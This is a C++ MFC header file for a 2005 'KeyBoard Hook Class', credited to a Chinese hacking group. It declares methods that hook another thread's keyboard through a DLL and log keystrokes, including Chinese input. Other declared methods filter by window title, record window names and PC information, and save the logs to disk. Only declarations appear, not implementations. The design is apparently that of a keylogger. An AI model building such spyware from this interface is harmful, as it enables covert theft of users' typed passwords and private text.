/*===========================================================================
FileName:KeyBoardHook.h
Usage:KeyBoard Hook Class V1.2
发布： 火狐技术联盟[F.S.T] 2005/10/08
网站:http://www.wrsky.com
版权：原作者所有
=============================================================================*/
#include <afxwin.h>
#include <fstream.h>
typedef struct _KEYBOARDINFO{
int MaxDataLen;
char Key[2048];
char Savepath[MAX_PATH];
char Dll_path[MAX_PATH];
}KEYBOARDINFO,LPKEYBOARDINFO;
class KeyBoardHook  
{
public:
	void GetKeyNameTextByValue(char value,char *str,int size);
    KEYBOARDINFO KBINFO;
	int SaveCnStrLog(char *str,int size);
	void HookDeailCn(MSG Msg);
	void SetKBHookType(int type);
	int KBHookType;
	void StartLog();
	void StopLog();
	int Start();
	int SetKeyBoardHookThreadId(int threadid);
	int UnHookKeyBoard();
	int HookKeyBoard(int threadid);
	int StopKeyBoardHook();
	int StartKeyBoardHook();
    void HookDeail(MSG msg);
    void HookDeailCnEn(MSG Msg);
	KeyBoardHook();
	virtual ~KeyBoardHook();
    int  canlog;//能否记录标记
    unsigned char CNString[3];
    int  index;
    char old_winname[256],current_winname[256];
private:
	bool KeyIsInWinName(CString WinName);
    int InitLibrary(void);
    int SetKeyBoardHook(void);
    int RemoveKeyBoardHook(void);
    int SaveStrLog(char *);
    int SaveKeyLog(short key,int Word,int ShiftState);
    int SaveWindowName(void);
    void TimeVal(void);
    int WritePcInfo(void);
    void RemoveLibrary(void);

};

